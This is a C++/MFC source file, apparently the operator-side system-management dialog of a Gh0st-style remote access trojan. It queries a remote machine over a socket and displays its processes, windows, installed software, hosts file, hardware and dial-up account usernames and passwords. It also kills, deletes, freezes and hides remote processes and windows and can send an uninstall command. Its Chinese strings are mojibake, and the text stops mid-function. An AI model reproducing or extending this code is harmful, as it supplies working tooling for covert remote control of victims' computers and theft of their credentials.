// SystemDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "SystemDlg.h"
#include "FileAttr.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog

extern int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes);    //����ͼ��

CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CSystemDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSystemDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;

	dwPrs = 0;
	m_bOnClose = FALSE;

	SHFILEINFO	sfi;
	SHGetFileInfo
		(
		"\\\\",
		FILE_ATTRIBUTE_NORMAL, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES
		);
	HIMAGELIST hImageList;
	// ����ϵͳͼ���б�
	
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
        sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
		);
	m_ImageList = CImageList::FromHandle(hImageList);
}


void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSystemDlg)
	DDX_Control(pDX, IDC_TAB, m_Tab);
	DDX_Control(pDX, IDC_LIST, m_List);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
	//{{AFX_MSG_MAP(CSystemDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, OnSelchangeTab)
	ON_NOTIFY(NM_RCLICK, IDC_LIST, OnRclickList)
	ON_COMMAND(IDM_REFRESHPSLIST, OnRefreshpslist)
	ON_COMMAND(ID_SYSTEM_COPY, OnSystemCopy)
	ON_COMMAND(ID_SYSTEM_KILLANDDEL, OnSystemKillanddel)
	ON_COMMAND(ID_SYSTEM_KILLPROCESS, OnSystemKillprocess)
	ON_COMMAND(ID_FREEZING, OnFreezing)
	ON_COMMAND(ID_THAW, OnThaw)
	ON_COMMAND(ID_FILEATTR, OnFileattr)
	ON_COMMAND(ID_BAIDU, OnBaidu)
	ON_COMMAND(ID_WORLD, OnWorld)
	ON_COMMAND(ID_SYSTEM_WINDOW_RETURN, OnSystemWindowReturn)
	ON_COMMAND(ID_SYSTEM_WINDOW_HIDE, OnSystemWindowHide)
	ON_COMMAND(ID_SYSTEM_WINDOW_CLOST, OnSystemWindowClost)
	ON_COMMAND(ID_SYSTEM_WINDOW_MAX, OnSystemWindowMax)
	ON_COMMAND(ID_SYSTEM_WINDOW_MIN, OnSystemWindowMin)
	ON_COMMAND(ID_SYSTEM_UNINSTALL, OnSystemUninstall)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()
void CSystemDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
	case TOKEN_WSLIST:
		ShowWindowsList();
		break;
	case TOKEN_FILEATTR:
		ShowFileAttr();
		break;
	case TOKEN_DIALUPASS:
		ShowDialupassList();
		break;
	case TOKEN_SOFTWARE:
		ShowSoftWareList();
		break;
	case TOKEN_HOSTS:
		ShowHostsList();
		break;
	case TOKEN_HARDWARE:
		ShowHardwareList();
		break;
	default:
		// ���䷢���쳣����
		break;
	}
}
/////////////////////////////////////////////////////////////////////////////
// CSystemDlg message handlers

BOOL CSystemDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	str.Format("\\\\%s - ϵͳ����", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	
	m_Tab.InsertItem(0, "���̹���");
	m_Tab.InsertItem(1, "���ڹ���");
	m_Tab.InsertItem(2, "��������");
	m_Tab.InsertItem(3, "�����Ϣ");
	m_Tab.InsertItem(4, "HOST�ļ�");
	m_Tab.InsertItem(5, "Ӳ����Ϣ");

	AdjustList();
    ShowProcessList();

// 	UINT uiGroupFind[] = {IDM_REFRESHPSLIST,ID_SYSTEM_COPY,ID_SYSTEM_KILLANDDEL,ID_SYSTEM_KILLPROCESS,ID_FREEZING,ID_THAW,ID_FILEATTR,ID_BAIDU,ID_WORLD,ID_SYSTEM_WINDOW_RETURN,ID_SYSTEM_WINDOW_HIDE,ID_SYSTEM_WINDOW_CLOST,ID_SYSTEM_WINDOW_MAX,ID_SYSTEM_WINDOW_MIN,ID_SYSTEM_UNINSTALL};
//  XTPImageManager()->SetIcons(IDB_MENU_SYSTEM, uiGroupFind, sizeof(uiGroupFind)/sizeof(UINT), CSize(16, 16));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}


void CSystemDlg::AdjustList()
{
	RECT	rectClient;
	RECT	rectList;
	RECT	rectTab;

	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 22;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom - 0;

	rectTab.left = 0;
	rectTab.top = 0;
	rectTab.right = rectClient.right - 5;
	rectTab.bottom = rectClient.bottom - 25;
	
	m_Tab.MoveWindow(&rectTab);
	m_List.MoveWindow(&rectList);
}

CString __MakePriority(DWORD dwPriClass)
{
	CString strRet;
	switch(dwPriClass)
	{
	case REALTIME_PRIORITY_CLASS:
		strRet = "ʵʱ";
		break;
	case HIGH_PRIORITY_CLASS:
		strRet = "��";
		break;
	case ABOVE_NORMAL_PRIORITY_CLASS:
		strRet = "���ڱ�׼";
		break;
	case NORMAL_PRIORITY_CLASS:
		strRet = "��׼";
		break;
	case BELOW_NORMAL_PRIORITY_CLASS:
		strRet = "���ڱ�׼";
		break;
	case IDLE_PRIORITY_CLASS:
		strRet = "����";
		break;
	default:
		strRet = "δ֪";
		break;
	}
	
	return strRet;
}

void CSystemDlg::ShowProcessList()
{
	DeleteList();
	
	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT| LVS_EX_SUBITEMIMAGES);
	
	m_List.InsertColumn(0, "ӳ������", LVCFMT_LEFT, 100);
	m_List.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
	m_List.InsertColumn(2, "���ȼ�", LVCFMT_LEFT, 50);
	m_List.InsertColumn(3, "�߳���", LVCFMT_LEFT, 50);
	m_List.InsertColumn(4, "�û���", LVCFMT_LEFT, 70);
	m_List.InsertColumn(5, "�ڴ�", LVCFMT_LEFT, 70);
	m_List.InsertColumn(6, "�ļ���С", LVCFMT_LEFT, 80);
	m_List.InsertColumn(7, "����·��", LVCFMT_LEFT, 300);
	
	m_List.SetImageList(m_ImageList,LVSIL_SMALL);
	
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char	*strExeFile;
	char	*strProcessName;
	char    *strTemp; 
	DWORD	dwOffset = 0;
	CString str;
	char	*strProcessUser;
	int		i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		strExeFile = lpBuffer + dwOffset + sizeof(DWORD);
		strProcessName = strExeFile + lstrlen(strExeFile) + 1;
		strTemp = strProcessName + lstrlen(strProcessName)+1;
		LPDWORD	lpdwPriClass = LPDWORD(strTemp);
		LPDWORD	lpdwThreads = LPDWORD(strTemp + sizeof(DWORD));
		strProcessUser = strTemp + sizeof(DWORD)*2;
		LPDWORD	lpdwWorkingSetSize = LPDWORD(strProcessUser + lstrlen(strProcessUser)+1);
		
		LPDWORD	lpdwFileSize = LPDWORD(strProcessUser + lstrlen(strProcessUser)+1 + sizeof(DWORD));
		
		m_List.InsertItem(i, strExeFile,GetIconIndex(strProcessName,GetFileAttributes(strProcessName)));
		
		str.Format("%5u", *lpPID);
		m_List.SetItemText(i, 1, str);
		
		m_List.SetItemText(i, 2,__MakePriority(*lpdwPriClass));
		
		str.Format("%5u", *lpdwThreads);
		m_List.SetItemText(i, 3, str);
		
		m_List.SetItemText(i, 4, strProcessUser);
		
		str.Format("%5u K",*lpdwWorkingSetSize);
		m_List.SetItemText(i, 5 , str); 
		
		str.Format("%5u KB",*lpdwFileSize);
		m_List.SetItemText(i, 6 , str); 
		
		m_List.SetItemText(i, 7, strProcessName);
		
		// ItemData Ϊ����ID
		m_List.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD)*5 + lstrlen(strExeFile) + lstrlen(strProcessName) + lstrlen(strProcessUser) + 3;
	}
	
	str.Format("����·�� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_List.SetColumn(7, &lvc);
}

//��ʾ�ļ�����
void CSystemDlg::ShowFileAttr()
{
	CFileStatus FileAttr;
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	
	memcpy(&FileAttr,lpBuffer,sizeof(CFileStatus));
	/**************************������ģ̬�Ի���**********************************/
	CFileAttr dlg(this);
	dlg.m_strSize.Format("%dKB",FileAttr.m_size / 1024);//�ļ���С
	dlg.m_strCTime = FileAttr.m_ctime.Format("%Y��%m��%d�� %H:%M:%S");//����ʱ��
	dlg.m_strMTime = FileAttr.m_mtime.Format("%Y��%m��%d�� %H:%M:%S");//�޸�ʱ��
	dlg.m_strATime = FileAttr.m_atime.Format("%Y��%m��%d�� %H:%M:%S");//����ʱ��
	if((FileAttr.m_attribute & 0x01) == 0x01)
		dlg.m_bReadOnly = TRUE;
	else
		dlg.m_bReadOnly = FALSE;
	//�ж��Ƿ�����
	if((FileAttr.m_attribute & 0x02) == 0x02)
		dlg.m_bHidden = TRUE;
	else
		dlg.m_bHidden = FALSE;
	//�ж��Ƿ�浵
	if((FileAttr.m_attribute & 0x20) == 0x20)
		dlg.m_bArchive = TRUE;
	else
		dlg.m_bArchive = FALSE;
	//�ж��Ƿ���ϵͳ�ļ�
	if((FileAttr.m_attribute & 0x04) == 0x04)
		dlg.m_bSystem = TRUE;
	else
		dlg.m_bSystem = FALSE;
	
	dlg.m_FilePath = FileAttr.m_szFullName; //�ļ�·��
	
	int i = dlg.m_FilePath.ReverseFind('\\');
	if(i > 0)
		dlg.m_FileName = dlg.m_FilePath.Mid(i+1);
	
	dlg.DoModal();
}

void CSystemDlg::ShowWindowsList()
{
	DeleteList();
	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_SUBITEMIMAGES);
	m_List.InsertColumn(0, "PID", LVCFMT_LEFT, 75);
	m_List.InsertColumn(1, "���", LVCFMT_LEFT, 70);
	m_List.InsertColumn(2, "��������", LVCFMT_LEFT, 250);
	m_List.InsertColumn(3, "����״̬", LVCFMT_LEFT, 70);
	
	
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSTEMICO_WIN));	
	m_List.SetImageList(&m_ImgList,LVSIL_SMALL);
	
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char	*lpTitle = NULL;
	CString	str;
	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		LPDWORD	hwnd = LPDWORD(lpBuffer + dwOffset + sizeof(DWORD));
		lpTitle = (char *)lpBuffer + dwOffset + sizeof(DWORD)*2;
		str.Format("%5u", *lpPID);
		m_List.InsertItem(i, str);
		str.Format("%5u", *hwnd);
		m_List.SetItemText(i, 1,str);
		m_List.SetItemText(i, 2, lpTitle);
		m_List.SetItemText(i, 3,"��ʾ");
		// ItemData Ϊ����ID
		m_List.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD)*2 + lstrlen(lpTitle) + 1;
	}
	str.Format("�������� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_List.SetColumn(2, &lvc);
}

void CSystemDlg::ShowDialupassList()
{
	DeleteList();
	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT| LVS_EX_SUBITEMIMAGES);
	
	m_List.InsertColumn(0, "����", LVCFMT_LEFT, 75);
	m_List.InsertColumn(1, "�û�", LVCFMT_LEFT, 90);
	m_List.InsertColumn(2, "����", LVCFMT_LEFT, 90);
	m_List.InsertColumn(3, "�绰/����", LVCFMT_LEFT, 160);
	m_List.InsertColumn(4, "�豸", LVCFMT_LEFT, 220);
	
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSTEM_NET));	
	m_List.SetImageList(&m_ImgList,LVSIL_SMALL);
	
	
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 6; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;
			if (j > 0)
			{
				if (j == 1)
					m_List.InsertItem(i, lpString);
				else
					m_List.SetItemText(i, j - 1, lpString);
			}
			dwOffset += lstrlen(lpString) + 1;
		}
	}
}

void CSystemDlg::ShowSoftWareList()
{
	DeleteList();
	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);
	m_List.InsertColumn(0, "�������", LVCFMT_LEFT, 130);
	m_List.InsertColumn(1, "������", LVCFMT_LEFT, 85);
	m_List.InsertColumn(2, "�汾", LVCFMT_LEFT, 75);
	m_List.InsertColumn(3, "��װʱ��", LVCFMT_LEFT, 80);
	m_List.InsertColumn(4, "ж���������", LVCFMT_LEFT, 300);
	
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSTEM_SOFTWARE));	
	m_List.SetImageList(&m_ImgList,LVSIL_SMALL);
	
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 5; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;
			
			if (j == 0)
				m_List.InsertItem(i, lpString);
			else
				m_List.SetItemText(i, j, lpString);
			
			dwOffset += lstrlen(lpString) + 1;
		}
	}
}

void CSystemDlg::ShowHostsList()
{
	
	DeleteList();
	m_List.SetExtendedStyle(LVS_EX_FLATSB);
	m_List.InsertColumn(0, "����", LVCFMT_LEFT, 600);

	
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	
	int i=0;
	
	char *lpString = (char *)lpBuffer ;
	const char* d = "\n";
	char *p = strtok(lpString,d);
	while(p)
	{	
		m_List.InsertItem(i, p,10);
		p = strtok(NULL,d);
		i++;
	}
	
}

void CSystemDlg::ShowHardwareList()
{
	
	DeleteList();
	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);
	m_List.InsertColumn(0, "Ӳ������", LVCFMT_LEFT, 600);
	
	
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSTEM_HARF));	
	m_List.SetImageList(&m_ImgList,LVSIL_SMALL);
	
	
	CString str;
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	int i;
	
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 1; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;
			if (j == 0)
				m_List.InsertItem(i, lpString);
			else
				m_List.SetItemText(i, j , lpString);
			dwOffset += lstrlen(lpString) + 1;
		}
	}
	
	str.Format("Ӳ������ / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_List.SetColumn(0, &lvc);
	
	
}


BOOL CSystemDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	
	if ( pMsg->message == WM_KEYDOWN && pMsg->wParam  == VK_F5)
	{
//		OnMenuitemRefreshSlist();
		return TRUE;
	}
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CSystemDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	closesocket(m_pContext->m_Socket);
	
	m_bOnClose = TRUE;
	CDialog::OnClose();
}

void CSystemDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(!m_bOnClose)
		OnClose();
	
	
	delete this;
	CDialog::PostNcDestroy();
}

void CSystemDlg::OnSize(UINT nType, int cx, int cy) 
{
	if (!IsWindowVisible())
		return;
	// TODO: Add your message handler code here
	AdjustList();
}

void CSystemDlg::OnSelchangeTab(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	ShowSelectWindow();
	*pResult = 0;
}

void CSystemDlg::DeleteList()
{
	m_List.DeleteAllItems();	
	int nColumnCount= m_List.GetHeaderCtrl()->GetItemCount();
	
	for(int n=0;n<nColumnCount;n++)
	{
		m_List.DeleteColumn(0);
	}
}

void CSystemDlg::ShowSelectWindow()
{
	DeleteList();
	switch (m_Tab.GetCurSel())
	{
	case 0:
		GetProcessList();
		break;
	case 1:
		GetWindowsList();
		break;
	case 2:
		GetDialupassList();
		break;
	case 3:
		GetSoftWareList();
		break;
	case 4:
		GetHostsList();
		break;
	case 5:
		GetHardwareList();
		break;
	default:
		break;
	}
}

void CSystemDlg::GetProcessList()
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetWindowsList()
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetDialupassList()
{	
	BYTE bToken = COMMAND_DSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetSoftWareList()
{
	BYTE bToken = COMMAND_SOFTWARELIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetHostsList()
{
	BYTE bToken = COMMAND_HOSTS;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}

void CSystemDlg::GetHardwareList()
{
	BYTE bToken = COMMAND_HARDWARE;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}

void CSystemDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_SYSTEM);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	
	int a1[10] = {11,12,13,14,15,16,17,18,19,20};
	int a2[11] =  {3,4,5,6,7,8,9,10,11,19,20};
	int a3[18] = {3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20};
	int a4[17] = {3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,20};
	int a5[17] = {3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,20};
	int a6[17] = {3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,20};
	switch(m_Tab.GetCurSel())
	{
	case 0:
		{
			for (int i = 10 ; i> 0;i--)
			{
				pM->DeleteMenu(a1[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 1:
		{
			for (int i = 11 ; i> 0;i--)
			{
				pM->DeleteMenu(a2[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 2:
		{
			for (int i = 18 ; i> 0;i--)
			{
				pM->DeleteMenu(a3[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 3:
		{
			for (int i = 17 ; i> 0;i--)
			{
				pM->DeleteMenu(a4[i-1], MF_BYPOSITION);
			}
		}
	case 4:
		{
			for (int i = 17 ; i> 0;i--)
			{
				pM->DeleteMenu(a5[i-1], MF_BYPOSITION);
			}
		}
	case 5:
		{
			for (int i = 17 ; i> 0;i--)
			{
				pM->DeleteMenu(a6[i-1], MF_BYPOSITION);
			}
		}
		break;
	default:
		break;
	}
	
	CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y, this);
	*pResult = 0;
}

void CSystemDlg::OnRefreshpslist() 
{
	// TODO: Add your command handler code here
	ShowSelectWindow();
}

void CSystemDlg::SetClipboardText(CString &Data)
{
	if(::OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		CopyMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}

void CSystemDlg::OnSystemCopy() 
{
	// TODO: Add your command handler code here
	if (m_List.GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_List.GetFirstSelectedItemPosition();
	CString Data;
	CString temp;
	while(pos)
	{
		temp = "";
		int	nItem = m_List.GetNextSelectedItem(pos);
		for(int i = 0; i < m_List.GetHeaderCtrl()-> GetItemCount(); i++)
		{
			temp += m_List.GetItemText(nItem, i);
			temp += "	";
		}
		Data += temp;
		Data += "\r\n";
	}
	SetClipboardText(Data);
	MessageBox("�Ѹ������ݵ����а�");
}

// typedef SIZE_T
// (WINAPI
//  *LocalSizeT)(
//  __in HLOCAL hMem
//     );

void CSystemDlg::OnSystemKillanddel() 
{
	// TODO: Add your command handler code here
	KillprocessDel(COMMAND_KILLPROCESS,"��ɾ��");
}

void CSystemDlg::OnSystemKillprocess() 
{
	// TODO: Add your command handler code here
	if (m_Tab.GetCurSel() == 0 )
	{
		KillprocessDel(COMMAND_KILLPROCESS,"");
	}
	else
	{
		KillprocessDel(COMMAND_KILLPROCESS_WINDOW,"");
	}
}

void CSystemDlg::KillprocessDel(BYTE Buffer ,char *strbuf) 
{
	
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 2 + (m_List.GetSelectedCount() * 4));
	lpBuffer[0] = Buffer;
	
	if(strbuf == "��ɾ��")
	{
		
		lpBuffer[1] = 1;
	}
	else
	{
		
		lpBuffer[1] = 0;
	}
	
	char *lpTips = 
		"����: ��ֹ���̻ᵼ�²�ϣ�������Ľ����\n"
		"�������ݶ�ʧ��ϵͳ���ȶ����ڱ���ֹǰ��\n"
		"���̽�û�л��ᱣ����״̬�����ݡ�";
	CString str;
	if (m_List.GetSelectedCount() > 1)
	{
		str.Format("%sȷʵ\n����ֹ%s��%d�������?", lpTips, strbuf,m_List.GetSelectedCount());	
	}
	else
	{
		str.Format("%sȷʵ\n����ֹ%s���������?", lpTips, strbuf);
	}
	if (::MessageBox(m_hWnd, str, "���̽�������", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
	
	DWORD	dwOffset = 2;
	POSITION pos = m_List.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_List.GetNextSelectedItem(pos);
		DWORD dwProcessID = m_List.GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	
//	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
	ShowSelectWindow();
}

void CSystemDlg::OnFreezing() 
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_List;
	
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_FREEZING;
	
	char *lpTips = "���棺������̻ᵼ�½�����ͣ���д��ڹ���״̬";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%sȷʵ\n�붳����%d�������?", lpTips, pListCtrl->GetSelectedCount());	
	}
	else
	{
		str.Format("%sȷʵ\n�붳����������?", lpTips);
	}
	
	
	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnThaw() 
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_List;
	
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_THAW;
	
	char *lpTips = "���棺�ⶳ���̻ᵼ�½��ָ̻���������";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%sȷʵ\n��ⶳ��%d�������?", lpTips, pListCtrl->GetSelectedCount());	
	}
	else
	{
		str.Format("%sȷʵ\n��ⶳ���������?", lpTips);
	}
	//	if (::MessageBox(m_hWnd, str, "���̶��ᾯ��", MB_YESNO|MB_ICONQUESTION) == IDNO)
	//		return; 
	
	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnFileattr() 
{
	// TODO: Add your command handler code here
	if (m_List.GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_List.GetFirstSelectedItemPosition();
	CString str;
	while(pos)
	{
		int	nItem = m_List.GetNextSelectedItem(pos);
		str = m_List.GetItemText(nItem, 7);
		if (str.GetLength() > 0)
		{
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + str.GetLength());
			lpBuffer[0] = COMMAND_FILEATTR;
			memcpy(lpBuffer+1,str.GetBuffer(0),str.GetLength());
			m_iocpServer->Send(m_pContext,lpBuffer,str.GetLength() + 1);
		}
	}
}

void CSystemDlg::OnBaidu() 
{
	// TODO: Add your command handler code here
	if (m_List.GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_List.GetFirstSelectedItemPosition();
	CString str;
	while(pos)
	{
		int	nItem = m_List.GetNextSelectedItem(pos);
		str = m_List.GetItemText(nItem, 0);
		if (str.GetLength() > 0)
		{
			CString url = "https://www.baidu.com/s?wd=";
			url += str;
			ShellExecute(NULL,"open",url,NULL,NULL,SW_SHOW);
		}
	}
}

void CSystemDlg::OnWorld() 
{
	// TODO: Add your command handler code here
	CString url = "http://www.virscan.org/";
	ShellExecute(NULL,"open",url,NULL,NULL,SW_SHOW);
}

void CSystemDlg::OnSystemWindowReturn() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_List.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_List.GetItemText(nItem, 1));
		
		m_List.SetItemText(nItem,3,"��ʾ");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_RESTORE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnSystemWindowHide() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_List.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
